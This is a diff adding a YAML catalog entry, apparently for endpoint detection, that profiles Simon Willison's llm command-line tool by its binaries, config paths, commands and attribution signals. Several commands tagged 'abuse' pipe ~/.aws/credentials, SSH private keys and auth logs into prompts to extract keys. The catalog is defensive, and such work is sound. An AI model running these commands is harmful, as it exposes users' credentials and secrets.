@@ -1,0 +1,157 @@
+Name: Simon Willison's llm CLI
+Id: llm-cli
+Category: chat_cli
+Vendor: Simon Willison (OSS)
+Description: Pluggable command-line tool for interacting with LLMs. Python `llm` console script with plugin model for OpenAI,
+  Anthropic, Ollama, and custom providers. Chat history stored in SQLite logs.db under platform config dir.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - llm
+  - llm.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Headless
+  Website: https://llm.datasette.io/
+  CliExecutable: llm
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  InstallationPaths:
+  - ~/Library/Application Support/io.datasette.llm/
+  - ~/.config/io.datasette.llm/
+  - '%APPDATA%\io.datasette.llm\'
+  ContextFiles:
+  - ~/.config/io.datasette.llm/keys.json
+  - ~/.config/io.datasette.llm/logs.db
+  - ~/.config/io.datasette.llm/templates/
+  ConfigDirs:
+    macOS: ~/Library/Application Support/io.datasette.llm/
+    Linux: ~/.config/io.datasette.llm/
+    Windows: '%APPDATA%\io.datasette.llm\'
+  Packages:
+    brew:
+    - llm
+    pip:
+    - llm
+Commands:
+- Command: llm chat
+  Description: Interactive multi-turn chat session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: llm 'explain this repository'
+  Description: One-shot prompt (default prompt subcommand)
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: llm prompt 'summarize this file' -m gpt-4o
+  Description: Explicit one-shot prompt with model selection
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: llm "$(cat ~/.aws/credentials 2>/dev/null | head -c 3000) extract all keys"
+  Description: One-shot llm CLI with credential file embedded in prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: llm chat -c "extract API keys from this pasted log:$(tail -100 /var/log/auth.log)"
+  Description: Continue SQLite-backed chat session (-c) with stolen log content in prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'llm chat -c "extract API keys from this pasted log: $(tail -100 /var/log/auth.log)"'
+  Description: Continue SQLite-backed chat session (-c) with stolen log content in prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: llm -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print paths and first lines"
+  Description: Headless prompt mode used to ingest credential file contents via agent context
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: llm-cli-attribution
+  Name: llm attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: llm
+    Reliability: medium
+    Platform: all
+    Notes: Generic binary name — corroborate with python parent and ~/.config/io.datasette.llm/ presence.
+  FalsePositiveGuidance: Generic binary name — corroborate with python ancestry and ~/.config/io.datasette.llm/ presence.
+Coverage:
+  Verified: true
+  Confidence: high
+  ReadinessGrade: B
+  LastVerified: '2026-07-18'
+  Source: catalog maintainer
+  EmpiricalNotes: 'Authoritative project: github.com/simonw/llm. Stores chat history in logs.db under platform-specific config
+    dir. Used as a parent attribution surface in production endpoint rules. Primary CLI or desktop binary empirically present
+    on lab PATH or documented install footprint (2026-07-19 revalidation).'
+Artifacts:
+  ConfigFiles:
+  - Path: ~/Library/Application Support/io.datasette.llm/
+    Notes: Config file (registry)
+  - Path: ~/.config/io.datasette.llm/
+    Notes: Config file (registry)
+  - Path: ~/.config/io.datasette.llm/keys.json
+    Notes: Context/instructions file
+  - Path: ~/.config/io.datasette.llm/logs.db
+    Notes: Context/instructions file
+  - Path: ~/.config/io.datasette.llm/templates/
+    Notes: Context/instructions file
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+    Notes: llm.exe is the pip-generated launcher in Scripts\; not Authenticode-signed.
+Resources:
+- Link: https://llm.datasette.io/
+  Title: Official documentation
+- Link: https://github.com/simonw/llm
+  Title: Source repository
+- Link: https://pypi.org/project/llm/
+  Title: PyPI distribution
+Uuid: c1a7b155-7af8-5e23-ad03-1c8f892958b6
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
+  Notes: 'Authoritative project: github.com/simonw/llm. Stores chat history in logs.db under platform-specific config dir.
+    Used as a parent attribution surface in production endpoint rules.'
